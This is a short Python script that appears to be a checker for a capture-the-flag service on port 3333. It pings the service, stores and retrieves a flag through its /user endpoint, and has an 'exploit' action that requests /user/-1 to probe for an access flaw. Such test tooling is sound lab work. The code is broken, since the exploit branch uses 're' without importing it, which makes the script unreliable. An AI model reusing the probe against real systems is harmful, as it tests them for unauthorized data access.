#!/usr/bin/python3
import sys
import requests
sys.path.insert(0, "./lib")
from lib.decorators import cmd_args

@cmd_args
def run(action="ping", ip=None, flag=None):
    if action == "ping":
        req = requests.get(f"http://{ip}:3333/user", timeout=2)
        if req.status_code == 200:
            return 0
        return 1
    elif action == "put":
        req = requests.post(f"http://{ip}:3333/user", json={"name": "test", 'password': flag})
        if req.status_code == 200:
            return req.text
    elif action == "get":
        req = requests.get(f"http://{ip}:3333/user/{flag}")
        if req.status_code == 200:
            return req.text
    elif action == "exploit":
        req = requests.get(f"http://{ip}:3333/user/-1")
        data = re.search(r"([{\[].*?[}\]])$", req.text)
        if data:
            return 1
        return 0


print(run())

